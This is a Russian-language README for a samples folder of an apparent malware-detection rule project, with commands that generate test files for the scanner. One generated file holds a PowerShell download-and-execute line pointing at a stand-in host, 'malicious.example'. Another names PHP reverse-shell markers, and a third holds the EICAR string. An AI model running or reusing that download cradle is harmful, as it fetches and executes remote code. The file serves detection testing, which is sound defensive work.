# Samples — тестовые образцы

Безвредные файлы для проверки правил. Часть образцов **намеренно выглядит вредоносно**
(EICAR, веб-шелл, обфусцированный PowerShell), поэтому они **не хранятся в репозитории** —
антивирус на Windows их удалил бы, да и выкладывать «зловредные» файлы дурной тон.
Вместо этого сгенерируй их локально одной командой (лучше в WSL/Linux, где не мешает антивирус).

## В репозитории лежат (безвредные)

| Файл | Триггерит правило |
|------|-------------------|
| `fake_pe.bin` | `Windows_Executable` (magic-байты `MZ`) |
| `clean.txt` | — (проверка на ложные срабатывания) |

## Сгенерировать остальные образцы

```bash
cd samples

# 1. Веб-шелл (детект-тест для PHP_Reverse_Shell) — не исполняемый, только маркеры
cat > webshell_test.php << 'EOF'
<?php
// Тестовый образец, ничего не выполняет.
// Маркеры php-reverse-shell: fsockopen(), proc_open(), "/bin/sh -i".
echo "detection test only";
EOF

# 2. Подозрительный PowerShell (детект-тест для Suspicious_PowerShell)
echo 'powershell.exe -enc SQBFAFgA; IEX(New-Object Net.WebClient).DownloadString("http://malicious.example/c2.ps1")' > suspicious.ps1

# 3. EICAR — стандартная тест-строка антивируса (безопасна, но AV её ловит)
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n' > eicar.txt
```

> `eicar.txt` содержит стандартную строку EICAR — она безопасна, но антивирус на Windows
> её удалит. Это ожидаемо: значит детект работает. Генерируй её в WSL/Linux-разделе.

После генерации запусти из корня проекта `./scan.sh` — сработают все правила.
